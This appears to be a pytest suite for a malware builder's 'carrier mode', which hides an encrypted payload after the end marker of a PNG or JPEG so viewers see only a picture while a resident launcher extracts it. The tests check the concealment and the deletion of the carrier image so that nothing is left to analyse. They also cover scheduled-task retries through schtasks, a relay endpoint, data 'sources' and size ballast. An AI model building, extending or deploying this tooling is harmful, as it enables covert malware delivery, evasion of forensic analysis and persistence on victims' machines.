"""Carrier mode: the exe container with an image where the launcher would be.

The claim this file has to hold is narrow and total: **the arithmetic does not change.** The
tail is the same tail, the footer is still the last eight bytes and the trailer still the 864
before it, so a launcher that is already on a machine opens a payload that arrived as a
picture with nothing but a path. Everything here is that sentence tested from both ends.

Three groups:

1. **The walk.** Where an image's own format stops. A PNG ends at its ``IEND`` chunk and a
   JPEG at its end-of-image marker; both decoders stop reading there, which is why bytes
   welded past them are invisible to a viewer and still addressable from the end of the file.
   The JPEG case is walked rather than searched deliberately: a thumbnail inside ``APP1`` is
   a complete JPEG with its own ``FFD9``, and "the last end marker in the file" is a bug that
   only shows up on photographs taken by a phone.
2. **The build.** ``forge`` welds the image and the loader reads it back, byte for byte,
   through the same three functions the exe path uses.
3. **The teardown.** The carrier is deleted once there is nothing left to deliver, which is
   what the reference set calls the point — an image that is gone leaves nothing to analyse.
   Running twice is the proof: the second run has no container and fails closed.
"""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agent import loader, util  # noqa: E402
from core import forge, pipeline, seal  # noqa: E402
from core import validate as validate_module  # noqa: E402
from core.schema import RelayConfig, RunConfig, SourceConfig  # noqa: E402
from tests.support import jpeg_stub, pe_stub, png_stub  # noqa: E402

CRYPTO = importlib.util.find_spec("Crypto") is not None
needs_crypto = pytest.mark.skipif(not CRYPTO, reason="pycryptodome is not installed")

MUTEX = "Global\\SABLE_CARRIER_MUTEX_7c41"
SEAL_KEY = "k-7c41-carrier-key"


def config(**overrides: object) -> RunConfig:
    base: dict[str, object] = {
        "schema_version": 1,
        "mutex": MUTEX,
        "seal_key": SEAL_KEY,
        "relay": RelayConfig(kind="https", endpoint="https://example.invalid/relay"),
        "sources": SourceConfig(),
        "self_remove": False,
        "ballast_mb": 0,
    }
    base.update(overrides)
    return RunConfig(**base)  # type: ignore[arg-type]


@pytest.fixture()
def png(tmp_path: Path) -> Path:
    path = tmp_path / "screenshot.png"
    path.write_bytes(png_stub())
    return path


@pytest.fixture()
def jpg(tmp_path: Path) -> Path:
    path = tmp_path / "photo.jpg"
    path.write_bytes(jpeg_stub(thumbnail=jpeg_stub()))
    return path


# --- the walk -----------------------------------------------------------------


def test_a_png_ends_at_its_iend_chunk() -> None:
    data = png_stub()
    assert forge.carrier_end(data) == len(data)


def test_a_jpeg_ends_at_its_end_of_image_marker() -> None:
    data = jpeg_stub()
    assert forge.carrier_end(data) == len(data)


def test_a_thumbnail_is_not_mistaken_for_the_end_of_the_picture() -> None:
    """The reason the walk is a walk.

    A phone photo carries a small complete JPEG inside ``APP1``. Its ``FFD9`` comes before the
    real one, so a reader that searched backwards for the last end marker would be right by
    luck and wrong the first time anything was appended. This fixture has the nested marker
    and asserts the walk lands past the outer one.
    """
    inner = jpeg_stub()
    assert inner.endswith(b"\xff\xd9")
    data = jpeg_stub(thumbnail=inner)
    assert data.count(b"\xff\xd9") >= 2
    assert forge.carrier_end(data) == len(data)


def test_bytes_past_the_image_are_not_part_of_it() -> None:
    """The property the whole mode rests on: a viewer stops at the terminator."""
    data = png_stub()
    assert forge.carrier_end(data + b"\x00" * 4096) == len(data)
    assert forge.carrier_end(jpeg_stub() + b"\xff" * 1024) == len(jpeg_stub())


def test_a_truncated_png_is_refused() -> None:
    with pytest.raises(forge.ForgeError, match="IEND"):
        forge.carrier_end(png_stub()[:-4])


def test_a_png_chunk_that_overstates_its_length_is_refused() -> None:
    """The length is read from the file, so it is checked before it moves a cursor."""
    data = bytearray(png_stub())
    # The IDAT length field sits right after IHDR: 8 signature bytes, then one 25-byte
    # chunk (4 length + 4 type + 13 body + 4 CRC). So the second length field is at 33.
    idat_length = 8 + 12 + 13
    data[idat_length:idat_length + 4] = (0x7FFFFFFF).to_bytes(4, "big")
    with pytest.raises(forge.ForgeError, match="runs past the file"):
        forge.carrier_end(bytes(data))


def test_a_jpeg_with_no_end_marker_is_refused() -> None:
    with pytest.raises(forge.ForgeError, match="end-of-image"):
        forge.carrier_end(jpeg_stub()[:-2])


def test_a_jpeg_segment_that_overstates_its_length_is_refused() -> None:
    data = bytearray(jpeg_stub())
    # APP0's length field is the two bytes right after its marker.
    data[4:6] = (0xFFF0).to_bytes(2, "big")
    with pytest.raises(forge.ForgeError, match="runs past the file"):
        forge.carrier_end(bytes(data))


def test_something_that_is_not_an_image_is_refused() -> None:
    with pytest.raises(forge.ForgeError, match="not a PNG or a JPEG"):
        forge.carrier_end(pe_stub(), "setup.exe")


# --- what a carrier must be ---------------------------------------------------


def test_a_carrier_that_already_carries_a_tail_is_refused(tmp_path: Path) -> None:
    """A build of a build is not a carrier.

    The footer would point at the new blob, the old one would sit behind it, and the file
    stops being an image the moment anyone compares its size to its own terminator.
    """
    path = tmp_path / "already.png"
    path.write_bytes(png_stub() + b"\x41" * 512)
    with pytest.raises(forge.ForgeError, match="already a container"):
        forge.carrier_size(path)


def test_an_empty_carrier_is_refused(tmp_path: Path) -> None:
    path = tmp_path / "empty.png"
    path.write_bytes(b"")
    with pytest.raises(forge.ForgeError, match="is empty"):
        forge.carrier_size(path)


def test_a_carrier_past_the_ceiling_is_refused(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    path = tmp_path / "huge.png"
    path.write_bytes(png_stub())
    monkeypatch.setattr(forge, "MAX_CARRIER_BYTES", 8)
    with pytest.raises(forge.ForgeError, match="ceiling"):
        forge.carrier_size(path)


# --- the build ----------------------------------------------------------------


@needs_crypto
def test_the_image_container_recovers_its_payload_with_the_loader_arithmetic(
    tmp_path: Path, png: Path
) -> None:
    """The accept criterion, stated as one test.

    Same ``expected_offset``, same footer, same trailer, same decrypt. The only difference
    from the exe path is which file is named.
    """
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(),
        seal.seal(data, SEAL_KEY),
        tmp_path / "delivered.png",
        mode=forge.OUTPUT_PNG,
        carrier=png,
    )

    image = built.read_bytes()
    assert image.startswith(b"\x89PNG\r\n\x1a\n"), "the head is still the image"
    assert forge.carrier_end(image) == png.stat().st_size, "the image still ends where it did"

    offset = loader._archive_offset(built)
    assert offset == forge.expected_offset(png.stat().st_size, 0)
    assert forged_trailer(built) == (SEAL_KEY, MUTEX)

    sealed_blob = loader._read_sealed(built, offset)
    assert loader._open_sealed(sealed_blob, SEAL_KEY) == data


def forged_trailer(built: Path) -> tuple[str, str]:
    """What the launcher would read out of the block before the footer."""
    trailer = loader._read_trailer(built)
    return trailer.seal_key, trailer.mutex


@needs_crypto
def test_ballast_moves_the_offset_on_a_carrier_too(tmp_path: Path, png: Path) -> None:
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(ballast_mb=2),
        seal.seal(data, SEAL_KEY),
        tmp_path / "delivered.png",
        mode=forge.OUTPUT_PNG,
        carrier=png,
    )
    offset = loader._archive_offset(built)
    assert offset == forge.expected_offset(png.stat().st_size, 2)
    assert loader._open_sealed(loader._read_sealed(built, offset), SEAL_KEY) == data


def test_an_image_build_without_a_carrier_is_refused(tmp_path: Path) -> None:
    with pytest.raises(forge.ForgeError, match="needs a carrier image"):
        forge.build(config(), b"x" * 4096, tmp_path / "a.png", mode=forge.OUTPUT_PNG)


def test_an_exe_build_refuses_a_carrier(tmp_path: Path, png: Path) -> None:
    stub = tmp_path / "launcher.exe"
    stub.write_bytes(pe_stub())
    with pytest.raises(forge.ForgeError, match="takes a launcher"):
        forge.build(
            config(),
            b"x" * 4096,
            tmp_path / "a.exe",
            mode=forge.OUTPUT_EXE,
            stub=stub,
            carrier=png,
        )


def test_the_container_extension_has_to_match_the_mode(tmp_path: Path, png: Path) -> None:
    with pytest.raises(forge.ForgeError, match=r"must end \.png"):
        forge.build(
            config(),
            b"x" * 4096,
            tmp_path / "a.jpg",
            mode=forge.OUTPUT_PNG,
            carrier=png,
        )


def test_the_carrier_modes_are_in_the_mode_list() -> None:
    assert forge.OUTPUT_PNG in forge.OUTPUT_MODES
    assert forge.OUTPUT_JPG in forge.OUTPUT_MODES
    assert forge.OUTPUT_DIR not in forge.CARRIER_MODES


# --- the loader ---------------------------------------------------------------


@needs_crypto
def test_the_loader_reads_a_carrier_while_its_own_image_carries_nothing(
    tmp_path: Path, png: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Carrier mode with the launcher deliberately empty.

    ``util.executable_path`` is pointed at a file with no tail at all, so the only way this
    can succeed is if the carrier path is the one that was read. That is the whole point of
    the flag: a launcher already on the machine, opening a payload that arrived as a picture.
    """
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(),
        seal.seal(data, SEAL_KEY),
        tmp_path / "delivered.png",
        mode=forge.OUTPUT_PNG,
        carrier=png,
    )
    empty = tmp_path / "launcher.exe"
    empty.write_bytes(pe_stub())

    monkeypatch.setattr(util, "executable_path", lambda: empty)
    monkeypatch.setattr(util, "pending_queue", list)

    loader.cleanup()
    prepared = loader.prepare(built)
    try:
        assert prepared.source.read_bytes() == data
        with open(prepared.source, "rb") as handle:
            assert handle.read(4) == b"PK\x03\x04"
    finally:
        loader.cleanup()


@needs_crypto
def test_the_carrier_is_removed_once_there_is_nothing_left_to_deliver(
    tmp_path: Path, png: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(),
        seal.seal(data, SEAL_KEY),
        tmp_path / "delivered.png",
        mode=forge.OUTPUT_PNG,
        carrier=png,
    )
    monkeypatch.setattr(util, "pending_queue", list)

    loader.prepare(built)
    assert built.is_file()
    loader.cleanup()
    assert not built.exists(), "the container outlived the run that opened it"


@needs_crypto
def test_the_carrier_survives_while_something_is_parked(
    tmp_path: Path, png: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A parked archive brings this image back on a task.

    That run starts from a fresh command line and a fresh process, so the file it is pointed
    at has to still be there. Deleting on every exit would leave the retry pointing at
    nothing and turn a recoverable failure into a permanent one.
    """
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(),
        seal.seal(data, SEAL_KEY),
        tmp_path / "delivered.png",
        mode=forge.OUTPUT_PNG,
        carrier=png,
    )
    monkeypatch.setattr(util, "pending_queue", lambda: [tmp_path / "pending.zip"])

    loader.prepare(built)
    loader.cleanup()
    assert built.is_file(), "the retry task still needs its container"


@needs_crypto
def test_the_second_run_has_nothing_to_read(
    tmp_path: Path, png: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The two-run proof the plan asks for.

    Run once: the payload comes out and the carrier goes. Run again: there is no container,
    and the failure is a clean ``ArchiveError`` rather than a crash on a missing file or a
    decrypt of somebody else's bytes.
    """
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(),
        seal.seal(data, SEAL_KEY),
        tmp_path / "delivered.png",
        mode=forge.OUTPUT_PNG,
        carrier=png,
    )
    monkeypatch.setattr(util, "pending_queue", list)

    first = loader.prepare(built)
    assert first.source.read_bytes() == data
    loader.cleanup()
    assert not built.exists()

    with pytest.raises(loader.ArchiveError):
        loader.prepare(built)


def test_the_flag_is_read_in_both_spellings() -> None:
    assert loader.carrier_from(["agent.exe", "--carrier", "C:/a.png"]) == Path("C:/a.png")
    assert loader.carrier_from(["agent.exe", "--carrier=C:/b.jpg"]) == Path("C:/b.jpg")
    assert loader.carrier_from(["agent.exe", "--retry"]) is None
    assert loader.carrier_from(["agent.exe", "--carrier"]) is None


def test_a_reexec_gets_no_fragment_when_there_is_no_carrier() -> None:
    """An exe-mode artifact must not grow a flag that names nothing."""
    loader._state()["carrier"] = None
    assert loader.carrier_args() == []

    loader._state()["carrier"] = Path("C:/a.png")
    try:
        # ``str`` on a Windows path normalises the separators, so the expectation is the
        # normalised form rather than the literal that went in.
        assert loader.carrier_args() == [loader.CARRIER_FLAG, str(Path("C:/a.png"))]
    finally:
        loader._state()["carrier"] = None


# --- the retry task -----------------------------------------------------------


def test_the_retry_task_names_the_carrier(monkeypatch: pytest.MonkeyPatch) -> None:
    """A task carries no inherited argv.

    Without the flag the re-run looks for a tail on the executable, which in carrier mode
    carries none, and the whole parked queue becomes undeliverable.
    """
    seen: list[list[str]] = []

    def capture(arguments: list[str]) -> bool:
        seen.append(list(arguments))
        return True

    monkeypatch.setattr(util, "_schtasks", capture)
    assert util.schedule_retry(Path("C:/Program Files/app.exe"), ["--carrier", "C:/a.png"])

    command = seen[0][seen[0].index("/tr") + 1]
    # ``str(Path(...))`` normalises the separators, so the expectation is built the same way
    # rather than written out with forward slashes.
    executable = str(Path("C:/Program Files/app.exe"))
    assert command == f'"{executable}" --retry "--carrier" "C:/a.png"'


def test_a_quoted_carrier_path_is_refused_rather_than_scheduled(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(util, "_schtasks", lambda *a, **k: pytest.fail("scheduled anyway"))
    assert not util.schedule_retry(Path("C:/app.exe"), ["--carrier", 'C:/a"b.png'])


# --- the form -----------------------------------------------------------------


def test_an_image_mode_needs_a_carrier() -> None:
    problems = validate_module.validate(config(), mode=forge.OUTPUT_PNG)
    assert [p for p in problems if p.path == "output.carrier"]
    assert validate_module.blocking(problems)


def test_a_carrier_with_a_tail_is_a_blocking_problem(tmp_path: Path) -> None:
    path = tmp_path / "already.png"
    path.write_bytes(png_stub() + b"\x00" * 64)
    problems = validate_module.validate(config(), mode=forge.OUTPUT_PNG, carrier=path)
    stopped = [p for p in problems if p.path == "output.carrier"]
    assert stopped and validate_module.blocking(stopped)


def test_a_carrier_is_a_note_when_the_mode_does_not_use_one(png: Path) -> None:
    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, carrier=png)
    notes = [p for p in problems if p.path == "output.carrier"]
    assert notes and not validate_module.blocking(notes)


def test_a_real_carrier_passes_with_no_carrier_problem(png: Path, jpg: Path) -> None:
    for mode, path in ((forge.OUTPUT_PNG, png), (forge.OUTPUT_JPG, jpg)):
        problems = validate_module.validate(config(), mode=mode, carrier=path)
        assert [p for p in problems if p.path == "output.carrier"] == []


def test_the_icon_note_no_longer_calls_every_mode_a_script(tmp_path: Path) -> None:
    """``dir`` has a resource table and always did; the note said it did not."""
    icon = tmp_path / "a.ico"
    icon.write_bytes(bytes.fromhex("000001000100") + b"\x00" * 32)
    for mode in (forge.OUTPUT_PY, forge.OUTPUT_PNG, forge.OUTPUT_JPG):
        notes = [p for p in validate_module.validate(config(), mode=mode, icon=icon)]
        assert any("has no resource table" in p.message for p in notes), mode

    # The one-directory shape is a launcher tree, so its exe takes the same patch as exe
    # output does. The note used to fire here too, which was a line telling the operator a
    # setting was ignored while the build quietly applied it.
    assert validate_module.validate(config(), mode=forge.OUTPUT_DIR, icon=icon) == []


# --- the pipeline -------------------------------------------------------------


@needs_crypto
def test_a_png_artifact_is_named_and_written_as_a_png(tmp_path: Path, png: Path) -> None:
    outcome = pipeline.run(
        config(),
        root=ROOT,
        out_dir=tmp_path / "out",
        mode=forge.OUTPUT_PNG,
        carrier=png,
    )
    assert outcome.mode == forge.OUTPUT_PNG
    assert outcome.artifact.suffix == ".png"
    assert outcome.size == png.stat().st_size + _tail_size(outcome.artifact)


def _tail_size(artifact: Path) -> int:
    """Sealed blob plus trailer plus footer, measured rather than assumed."""
    return artifact.stat().st_size - loader._archive_offset(artifact)


@needs_crypto
def test_the_pipeline_refuses_an_image_mode_with_no_carrier(tmp_path: Path) -> None:
    with pytest.raises(pipeline.ValidationFailed) as caught:
        pipeline.run(
            config(), root=ROOT, out_dir=tmp_path / "out", mode=forge.OUTPUT_PNG
        )
    assert any(problem.path == "output.carrier" for problem in caught.value.problems)
